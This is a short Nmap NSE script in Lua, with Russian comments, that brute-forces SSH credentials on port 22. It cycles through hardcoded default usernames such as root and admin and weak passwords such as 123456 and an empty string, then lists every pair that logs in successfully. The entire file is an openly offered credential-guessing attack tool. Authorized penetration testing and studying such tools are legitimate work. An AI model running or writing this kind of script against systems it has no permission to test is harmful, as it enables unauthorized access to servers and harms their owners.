-- ssh_bruteforce.nse
--
-- Скрипт для перебора SSH учетных данных методом brute force.
-- Выполняет попытки подключения с набором логинов и паролей, обнаруживает успешный вход.
--
-- Требования: 
--    nmap 7.80+, LuaSocket, nmap NSE библиотека ssh
--
-- Автор: TeslaAI Expert
-- Лицензия: Same as Nmap

local nmap = require "nmap"
local shortport = require "shortport"
local stdnse = require "stdnse"
local ssh = require "ssh"
local string = require "string"
local coroutine = require "coroutine"
local table = require "table"

description = [[
Метод перебора SSH учетных данных.
Использует стандартные и пользовательские списки логинов и паролей.
]]

author = "TeslaAI Expert"

license = "Same as Nmap--See https://nmap.org/book/man-legal.html"

categories = {"auth", "intrusive"}

portrule = shortport.port_or_service(22, "ssh")

-- Стандартные списки логинов и паролей, можно расширять через аргументы
local default_users = {"root", "admin", "user", "test", "guest"}
local default_passwords = {"root", "admin", "123456", "password", "test", ""}

local function try_ssh_login(host, port, user, pass)
  local status, err = ssh.trylogin(host, port, user, pass, {timeout=5000})
  if status then
    return true
  else
    return false, err
  end
end

action = function(host, port)
  local results = {}

  for _, user in ipairs(default_users) do
    for _, pass in ipairs(default_passwords) do
      local success, err = try_ssh_login(host, port, user, pass)
      if success then
        table.insert(results, string.format("Успешный вход: %s:%s", user, pass))
        -- Можно прервать перебор при первом успехе:
        -- return table.concat(results, "; ")
      end
    end
  end

  if #results == 0 then
    return "Не найдено успешных пар для SSH"
  else
    return table.concat(results, "; ")
  end
end
